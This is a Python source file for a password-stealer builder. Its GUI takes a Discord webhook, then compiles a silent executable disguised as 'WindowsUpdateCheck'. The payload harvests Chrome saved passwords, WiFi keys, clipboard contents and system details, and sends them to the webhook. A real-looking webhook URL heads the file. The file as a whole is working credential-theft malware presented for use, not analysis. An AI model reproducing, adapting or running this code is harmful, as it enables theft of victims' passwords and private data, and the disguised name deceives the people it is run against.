https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO


import os
import sys
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk
import shutil
import tempfile
import textwrap
import requests

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook, json={"content": "Full stealer test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in [200, 204]:
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Full Password Stealer Builder - Fixed Edition")
    root.geometry("600x320")
    root.resizable(False, False)
    
    tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=15)
    webhook_entry = tk.Entry(root, width=80)
    webhook_entry.pack(pady=5)
    
    def run_test():
        hook = webhook_entry.get().strip()
        success, msg = test_webhook(hook)
        if success:
            messagebox.showinfo("OK", msg)
        else:
            messagebox.showerror("Failed", msg)
    
    tk.Button(root, text="TEST WEBHOOK", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
    
    progress = ttk.Progressbar(root, mode="indeterminate")
    
    def build():
        webhook = webhook_entry.get().strip()
        if not webhook or "discord.com/api/webhooks" not in webhook:
            messagebox.showerror("Nope", "Valid Discord webhook required.")
            return
        
        progress.pack(pady=15)
        progress.start()
        root.update()
        
        try:
            generate_malware(webhook)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", 
                "stealer.exe ready!\n\n"
                "Fixed Crypto import crash.\n"
                "Grabs Chrome passwords (weak pattern filter), WiFi keys, clipboard, full recon.\n"
                "100% silent, sends JSON file + fallback.")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", f"Build failed:\n{str(e)}")
        root.destroy()
    
    tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
    root.mainloop()

# =================== CLEANED STEALER PAYLOAD (NO CRYPTO IMPORT) ===================
stealer_code = textwrap.dedent('''
import os
import json
import sqlite3
import win32crypt
import shutil
import subprocess
import requests
import getpass
import platform
import socket
from datetime import datetime
import ctypes

WEBHOOK = "{WEBHOOK_PLACEHOLDER}"

def gather_data():
    data = {}
    user = getpass.getuser()
    data['user'] = user
    data['hostname'] = socket.gethostname()
    data['os'] = platform.platform()
    data['time'] = datetime.now().isoformat()

    # Clipboard
    try:
        CF_TEXT = 1
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            handle = user32.GetClipboardData(CF_TEXT)
            clipboard_data = ctypes.c_char_p(handle).value.decode('utf-8', errors='ignore')
            data['clipboard'] = clipboard_data
        user32.CloseClipboard()
    except:
        data['clipboard'] = "failed"

    # WiFi passwords
    data['wifi'] = []
    try:
        profiles_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True, encoding='utf-8', errors='ignore')
        profile_names = [line.split(":")[1].strip() for line in profiles_output.split('\\n') if "All User Profile" in line]
        for profile in profile_names:
            try:
                key_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], text=True, encoding='utf-8', errors='ignore')
                key_line = [line.split(":")[1].strip() for line in key_output.split('\\n') if "Key Content" in line]
                if key_line:
                    data['wifi'].append({profile: key_line[0]})
            except:
                pass
    except:
        data['wifi'] = ["failed"]

    # Chrome passwords
    data['chrome_passwords'] = []
    login_db = f"C:\\\\Users\\\\{user}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data"
    if os.path.exists(login_db):
        try:
            temp_db = os.path.join(os.getenv("TEMP"), "LoginTemp")
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_pw = row[2]
                try:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
                    if any(weak in decrypted.lower() for weak in ["possword", "p@ssw0rd", "password", "admin", "1234", "qwerty", "letmein"]):
                        data['chrome_passwords'].append({"url": url, "user": username, "pass": decrypted})
                except:
                    pass
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            data['chrome_passwords'] = [f"failed: {str(e)}"]

    return data

def exfil():
    payload_json = json.dumps(gather_data(), indent=2)
    temp_file = os.path.join(os.getenv("TEMP"), "report.json")
    try:
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write(payload_json)
        
        with open(temp_file, "rb") as f:
            files = {"file": ("grab.json", f)}
            content = {"content": f"**Password Grab** - {getpass.getuser()}@{socket.gethostname()}"}
            requests.post(WEBHOOK, data=content, files=files, timeout=30)
    except:
        try:
            requests.post(WEBHOOK, json={"content": f"**Fallback**\\n```json\\n{payload_json}\\n```"})
        except:
            pass
    finally:
        try:
            os.remove(temp_file)
        except:
            pass

exfil()

while True:
    import time
    time.sleep(3600)
''')

# =================== BUILD WITH BULLETPROOF IMPORTS ===================
def generate_malware(webhook):
    temp_dir = tempfile.mkdtemp(prefix="build_")
    script_path = os.path.join(temp_dir, "stealer.py")
    
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", webhook))
    
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name", "WindowsUpdateCheck",
        "--hidden-import", "win32crypt",
        "--hidden-import", "ctypes",
        "--hidden-import", "ctypes.windll",
        "--collect-all", "win32crypt",
        script_path
    ]
    
    result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"PyInstaller error:\\n{result.stderr}\\n\\nSTDOUT:\\n{result.stdout}")
    
    built_exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
    final_exe = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(built_exe, final_exe)
    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Built fixed stealer: {final_exe}")

if __name__ == "__main__":
    get_webhook()

if __name__ == "__main__":
    get_webhook()
